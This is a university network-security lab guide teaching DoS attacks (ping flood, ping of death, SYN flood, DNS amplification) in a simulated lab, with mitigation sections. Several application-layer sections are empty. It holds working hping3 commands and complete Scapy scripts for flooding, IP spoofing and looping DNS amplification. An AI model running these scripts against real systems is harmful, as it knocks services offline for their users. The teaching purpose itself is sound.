Laboratory created for the Computer Science Master course of Network Security held by B. Crispo at  UniTN

# DoS attacks: a Network Security laboratory
Authors:
> Matteo Bordignon [@bordi00](https://github.com/Bordi00)
> Greta Franchi [@GretaFranchi](https://github.com/GretaFranchi)
> Alessandro Perez [@AlessandroPerez](https://github.com/AlessandroPerez)

## Table of Contents
- [Types of attacks](#types-of-attacks)
- [Network Layer DoS attacks](#network-layer-dos-attacks)
  * [IP recap](#ip-recap)
  * [Ping Flood](#ping-flood)
  * [Ping of death](#ping-of-death)
  * [Mitigations](#mitigations)
- [Transport Layer DoS attacks](#transport-layer-dos-attacks)
  * [TCP recap](#tcp-recap)
  * [SYN flood](#syn-flood)
  * [Mitigations](#mitigations-1)
- [Application Layer attacks](#application-layer-attacks)
  * [HTTP recap](#http-recap)
  * [HTTP flood](#http-flood)
  * [RUDY attack](#rudy-attack)
  * [Slowloris attack](#slowloris-attack)
  * [Mitigations](#mitigations-2)
- [DDoS attacks](#ddos-attacks)
  * [DoS vs. DDoS](#dos-vs-ddos)
  * [DNS Amplification attack](#dns-amplification-attack)
  * [Mitigations](#mitigations-3)
- [References](#references)
## Types of attacks
A Denial-of-Service (DoS) attack [1](#references) is an attack meant to shut down a machine or network, making it inaccessible to its intended users. DoS attacks accomplish this by flooding the target with traffic, or sending it information that triggers a crash.
There are two main types of DoS attacks:

- Bandwidth-based (volumetric): attacks which aim to consume the bandwidth of the target (e.g.: ICMP flood, HTTP flood, DNS amplification, etc.) 
- Resource-based: attacks which aim to consume all the target resources such as buffer, memory, cpu execution cap. In this type are divide into:
  - Application Layer: these attacks target vulnerabilities in the application layer of a system. Instead of overwhelming the network with traffic, they exploit the application’s weaknesses to consume server resources or cause it to crash (e.g. Slowloris, HTTP Slow Post)
  - Protocol exploitation: these attacks exploit flaws in the network protocols to overload the target (e.g.: ping of death, SYN flood)
## Network Layer DoS attacks
The network layer provides the means of transferring variable-length network packets from a source to a destination host via one or more networks. This layer responds to service request from the transport layer and issues service requests to the data link layer. We will analyze the IP protocols and how this non secure protocol can be exploited by a malicious user.
### IP recap
During this lab we will use IPv4 since its the most used at the moment. This protocol is described in RFC 791 [2](#references) and the year after it became the standard of the Internet Protocol Suite (TCP/IP). The header consists of 14 fields, of which 13 are required.

![alt text](https://github.com/Bordi00/Network-Security-23-24/blob/main/images/ipPacket.png)

The total length of the entire packet size including header and data is 65535 bytes and the minimum size is 20 bytes (header without data). Some of the fields important to us are: fragment offset (since the message can be split in different ip packets), protocol (it can be set to ICMP, TCP, UDP and others) and lastly source and destination address.

#### GNS3
GNS3 is a Graphical Network Simulator [3](#references) created in python and under the GPL license. It will be the environment where the lab will happen to start it open a terminal type `gns3` and press enter.

To use our topology select, by double clicking, "DoS_lab" from the project library tab; to start all the machines press the green play button in the top left. Our topology is divided in two LANs one that contains the attacker (the yellow one) and a second one that contains the victim (light blue). If you want to interact with any of the elements in the topology just right click it and a drop down menu will appear. For example if you want to open a terminal on the Kali-machine-1 (the attacker) right click it and select terminal from the menu. During this lab Kali-machine-1 will be us, the attacker, and Victim is the target of our attacks.
### Ping Flood
Ping flood is a volume based attack where we try to take the hole bandwidth for our self by spamming pings to the victim, this will render the server unreachable to any one else. To do so we will use the `hping3` on the Kali machine using the flag `-1` for ICMP and `--flood` to spam ping messages. To see the result of our attacks we will first start a ping from PC1 towards the victim with the command:

`ping 192.168.100.18 -t`

the flag -t here is to continuously ping the server; if it will ever go down we will see a timeout in the logs. To start the attack we open the shell on the Kali machine and use the command:

`hping3 -1 --flood 192.168.100.18`

once we start the command we can see that the pings from PC1 won't be received from the victim this can also be seen if we click on the connection between the router and the server and open Wireshark there. To make this attack less detectable we can add the flag 
`--rand-source` . To end the attack just press `Ctrl+C` on the Kali shell and you will see that the pings will be received by the server once again.
### Ping of death
Ping of death is a resource based attack with the goal to crash a server due to it allocating too little space for the received package. As already mention the maximum length of a ping is 65535 with 20 used by the header but in many older versions of OSs the allocated space is way less (e.g. one datagram which is 1500 bytes); this oversite was repeated even in IPv6. For our exercise open the terminal on Kali-machine-1 and edit the unfinished version of `ping_of_death.py` with either vim or nano. One possible solution is:

```python
from scapy.all import *
target_ip = "192.168.100.18" # insert target ip
ip = IP(dst=target_ip)
icmp = ICMP()
raw = Raw(b'X'*65500)
packet = ip / icmp / raw
send(fragment(packet), loop=1, verbose=0)
```

To check if the scrip is correct launch it with the command

`python3 ping_of_death.py`

and see if the ping from the PC1 don't reach the victim
### Mitigations
The mitigation vary from more to less extreme and are:
- Not allow ping at all
- Have Access Control Lists
  - They can check if the same IP is trying to send too many packages;
  - They can see if the IP is well formed;
- Use firewalls
  - It can see if the content of the ping is larger than expected ;

## Transport Layer DoS attacks
The transport layer [4](#references) ensures reliable, error-free delivery of data between end systems, such as computers or servers. It also provides mechanisms for error detection, flow control, and congestion avoidance and manages the transmission of messages from layers 1 through 3.

These attacks target the transport layer (layer 4) of the OSI model, with the goal of overloading the target’s servers or network devices. Transport layer DoS attacks include SYN (synchronization) floods, TCP (Transmission Control Protocol) floods, and UDP (User Datagram Protocol) floods. Transport layer attacks can result in the limiting of reach bandwidth or connections of hosts or networking equipment.
### TCP recap
Transmission Control Protocol (TCP) is a foundational communication protocol within computer networks, ensuring reliable data transmission between devices. It operates at the transport layer of the OSI model, facilitating the establishment, maintenance, and termination of connections. TCP guarantees that data packets sent from one system to another arrive intact and in the correct order by implementing mechanisms such as sequencing, acknowledgment, and retransmission of lost data. It provides a connection-oriented, full-duplex communication channel, supporting applications like web browsing, email, file transfer, and more. TCP is a fundamental component of the TCP/IP protocol suite, which underpins the internet and many other networks.
The TCP is described by the RFC-793 [5](#references). A TCP header is composed as shown it the image below:

![alt text](https://github.com/Bordi00/Network-Security-23-24/blob/main/images/tcp_header.png)

The relevant fields to us are:
- **Source and destination ports**: identifies the sending and receiving applications on the source and destination devices, respectively.
- **Flags**: control information such as SYN (synchronize), ACK (acknowledge), FIN (finish), and RST (reset) flags, managing the TCP connection's state.
### SYN flood 
SYN flood [6](#references) attacks work by exploiting the handshake process of a TCP connection. Under normal conditions, TCP connection exhibits three distinct processes in order to make a connection.

1. First, the client sends a SYN packet to the server in order to initiate the connection.
2. The server then responds to that initial packet with a SYN/ACK packet, in order to acknowledge the communication.
3. Finally, the client returns an ACK packet to acknowledge the receipt of the packet from the server. After completing this sequence of packet sending and receiving, the TCP connection is open and able to send and receive data.

![alt-text](https://github.com/Bordi00/Network-Security-23-24/blob/main/images/three-way-handshake.jpg)

To create denial-of-service, an attacker exploits the fact that after an initial SYN packet has been received, the server will respond back with one or more SYN/ACK packets and wait for the final step in the handshake. Here’s how it works:

1. The attacker sends a high volume of SYN packets to the targeted server, often with spoofed IP addresses.
2. The server then responds to each one of the connection requests and leaves an open port ready to receive the response.
3. While the server waits for the final ACK packet, which never arrives, the attacker continues to send more SYN packets. The arrival of each new SYN packet causes the server to temporarily maintain a new open port connection for a certain length of time, and once all the available ports have been utilized the server is unable to function normally.

![alt-text](https://github.com/Bordi00/Network-Security-23-24/blob/main/images/SYN-flood.png)

Now let us put into practice what we have just learnt: on GNS3, first open a terminal instance on PC1 and type `ping 192.168.100.18 -t` to check if you can reach the target, then open the Kali-machine terminal and edit the file named `syn_flood.py` using either vim or nano. Edit the script completing the functions. You can use the `RandShort()` function to generate random source ports. Once the script is ready, run it using `python3 syn_flood.py` and check the log on PC1 terminal. You should see that the destination doesn't respond to our echo request and ping command should return us a `request timeout`.

It follows the solution:

```python
from scapy.all import *

target_ip = "192.168.100.18" # insert target ip
target_port = 80 # insert target port

# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# to spoof the source IP you could use:
# ip = IP(dst=RandIP())

# forge TCP SYN packet with a random source port
# and the target port as destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags='S')

# add some flooding data (hint: raw uses bytes, in our case 1KB is enough)
raw = Raw(b'X'*1024)

# stack up the layers (hint: use the / operator)
p = ip / tcp / raw

# send packets 
send(p, loop=1, verbose=0)
```

### Mitigation
There are tons of way to prevent this attack today. Some of them are:

- **Installing an Intrusion Prevention System** [7](#references) to detect anomalous traffic patterns.
- **Configure the onsite firewall** for SYN Attack Thresholds and SYN Flood protection.
- **Installing up to date networking equipment** that has rate-limiting capabilities.
- **Increasing Backlog queue**: each operating system on a targeted device has a certain number of half-open connections that it will allow. One response to high volumes of SYN packets is to increase the maximum number of possible half-open connections the operating system will allow.
- **Recycling the Oldest Half-Open TCP connection**
- Use **SYN cookies**: this strategy involves the creation of a cookie by the server. In order to avoid the risk of dropping connections when the backlog has been filled, the server responds to each connection request with a SYN-ACK packet but then drops the SYN request from the backlog, removing the request from memory and leaving the port open and ready to make a new connection. If the connection is a legitimate request, and a final ACK packet is sent from the client machine back to the server, the server will then reconstruct (with some limitations) the SYN backlog queue entry.
## Application Layer attacks
### HTTP recap

### HTTP flood

### RUDY attack

### Slowloris attack

### Mitigation

## DDoS attacks
A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.

DDoS attacks achieve effectiveness by utilizing multiple compromised computer systems as sources of attack traffic. Exploited machines can include computers and other networked resources such as IoT devices.
### DoS vs. DDoS
A DoS (Denial of Service) attack typically involves a single attacker using one computer or network to flood a target server or network with a large volume of traffic or requests. This flood of traffic overwhelms the target's resources, causing it to become slow, unresponsive, or completely inaccessible to legitimate users.

On the other hand, a DDoS (Distributed Denial of Service) attack involves multiple attackers, often controlling networks of compromised computers (botnets [8](#references)) distributed across various locations. These attackers coordinate their efforts to launch a synchronized assault on the target, amplifying the volume of malicious traffic and making it more challenging to defend against.
### DNS Amplification attack
This DDoS attack [9](#references) is a reflection-based volumetric distributed denial-of-service (DDoS) attack in which an attacker leverages the functionality of open DNS resolvers in order to overwhelm a target server or network with an amplified amount of traffic, rendering the server and its surrounding infrastructure inaccessible.

![alt-text](https://github.com/Bordi00/Network-Security-23-24/blob/main/images/Learning_Center_DDoS_Diagrams_clean.webp)

A DNS amplification can be broken down into four steps:

1. The attacker uses a compromised endpoint to send UDP packets with spoofed IP addresses to a DNS recursor. The spoofed address on the packets points to the real IP address of the victim.
2. Each one of the UDP packets makes a request to a DNS resolver, often passing an argument such as “ANY” in order to receive the largest response possible.
3. After receiving the requests, the DNS resolver, which is trying to be helpful by responding, sends a large response to the spoofed IP address.
4. The IP address of the target receives the response and the surrounding network infrastructure becomes overwhelmed with the deluge of traffic, resulting in a denial-of-service.
While a few requests is not enough to take down network infrastructure, when this sequence is multiplied across multiple requests and DNS resolvers, the amplification of data the target receives can be substantial.

To implement this attack we will use the github repo created by [@Avielyo10](https://github.com/Avielyo10/DNS-Amplification-Lab?tab=readme-ov-file) 

On the provided Lubuntu VM create Docker network: `docker network create Lab`.

Run and connect to Sniff:

- `docker run --rm -ti --net Lab --name Sniff avielyosef/ubuntu-dns-amplification:sniff`

Run and connect to Attacker:

- `docker run --rm -ti --net Lab --name Attacker avielyosef/ubuntu-dns-amplification:attacker`

Run DNS1 on background:

- `docker run --rm -d --net Lab --name DNS1 --cap-add=NET_ADMIN andyshinn/dnsmasq`

Run DNS2 on background:

- `docker run --rm -d --net Lab --name DNS2 --cap-add=NET_ADMIN andyshinn/dnsmasq`

Run DNS3 on background:

- `docker run --rm -d --net Lab --name DNS3 --cap-add=NET_ADMIN andyshinn/dnsmasq` 

#### First Task: run base_script
**NOTE**: To resolve an IP from a running container run `docker inspect <container_name>`, for example: `docker inspect Sniff`.

Here we can see the `basic_script` from the Attacker container. Modify this script to send a DNS request with Sniff's IP, you can use any DNS container you want for this task.
Then run: `sudo python basic_script`.

Observe what the Sniffer as received.

It follows the solution:
```python
 #!/usr/bin/env python
 
from scapy.all import *
 
target     = "172.0.18.3" # Target host
nameserver = "172.0.18.5" # DNS server
domain     = "google.com" # Some domain name like "google.com" etc.

ip  = IP(src=target, dst=nameserver)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request = (ip/udp/dns)
 
send(request)
``` 

#### Second Task: improve base_script
Now that we understand how to spoof our own DNS packets, lets improve our code!

To see the load on the network open a new terminal and run: `docker exec -ti Sniff bash`, you should see Sniff's terminal, run `bmon`.

Modify our `basic_script` to send spoofed DNS requests in a loop! you have to use all the three DNS containers.

It follows the solution:
```python
 #!/usr/bin/env python
 
from scapy.all import *
 
target     = "172.0.18.3" # Target host
nameserver1 = "172.0.18.5" # DNS server 1
nameserver2 = "172.0.18.6" # DNS server 2
nameserver3 = "172.0.18.7" # DNS server 3
domain     = "google.com" # Some domain name like "google.com" etc.

ip1 = IP(src=target, dst=nameserver1)
ip2 = IP(src=target, dst=nameserver2)
ip3 = IP(src=target, dst=nameserver3)

udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request1 = (ip1/udp/dns)
request2 = (ip2/udp/dns)
request3 = (ip3/udp/dns)

while True:
	send(request1)
	send(request2)
	send(request3)
```

Observe what the Sniffer as received.

Once finished run `docker container stop <container_name>`, for example: `docker container stop Sniff`.

**NOTE:** Don't forget to stop all 5 containers.
### Mitigation
For an individual or company running a website or service, mitigation options are limited [10](#references). This comes from the fact that the individual’s server, while it might be the target, is not where the main effect of a volumetric attack is felt. Due to the high amount of traffic generated, the infrastructure surrounding the server feels the impact. The Internet Service Provider (ISP) or other upstream infrastructure providers may not be able to handle the incoming traffic without becoming overwhelmed. As a result, the ISP may blackhole [11](#references) all traffic to the targeted victim’s IP address, protecting itself and taking the target’s site off-line. Mitigation strategies are mostly preventative Internet infrastructure solutions.

- **Source IP verification** – stop spoofed packets leaving network: because the UDP requests being sent by the attacker’s botnet must have a source IP address spoofed to the victim’s IP address, a key component in reducing the effectiveness of UDP-based amplification attacks is for Internet service providers (ISPs) to reject any internal traffic with spoofed IP addresses.
- **Disabling or limiting Recursion on Authoritative Name Servers**: many of the DNS servers currently deployed on the Internet are exclusively intended to provide name resolution for a single domain. In these systems, DNS resolution for private client systems may be provided by a separate server and the authoritative server acts only as a DNS source of zone information to external clients. These systems do not need to support recursive resolution of other domains on behalf of a client, and should be configured with recursion disabled.
- **Response Rate Limiting (RRL)**: there is currently an experimental feature available as a set of patches for BIND9 that allows an administrator to limit the maximum number of responses per second being sent to one client from the name server. This functionality is intended to be used on authoritative domain name servers only as it will affect performance on recursive resolvers.
## References
1. [What is a denial of service attack (DoS) ?](https://www.paloaltonetworks.com/cyberpedia/what-is-a-denial-of-service-attack-dos)
2. [Internet Protocol: RFC-791](https://datatracker.ietf.org/doc/html/rfc791)
3. [GNS3](https://gns3.com/)
4. [Transport Layer DoS attacks](https://www.cdnetworks.com/cloud-security-blog/types-of-ddos-attacks/#:~:text=Transport%20Layer%20DDoS%20attacks&text=These%20attacks%20target%20the%20transport,(User%20Datagram%20Protocol)%20floods.)
5. [Transmission Control Protocol RFC-793](https://www.ietf.org/rfc/rfc793.txt)
6.  [SYN flood attack](https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/)
7. [IPS](https://www.vmware.com/topics/glossary/content/intrusion-prevention-system.html)
8. [Botnet](https://en.wikipedia.org/wiki/Botnet)
9. [DNS amplification DDoS attack](https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/)
10. [DNS amp mitigation](https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/)
11. [Blackhole traffic](https://www.cloudflare.com/learning/ddos/glossary/ddos-blackhole-routing/)
12. [CISA DNS amp mitigation](https://www.cisa.gov/news-events/alerts/2013/03/29/dns-amplification-attacks)
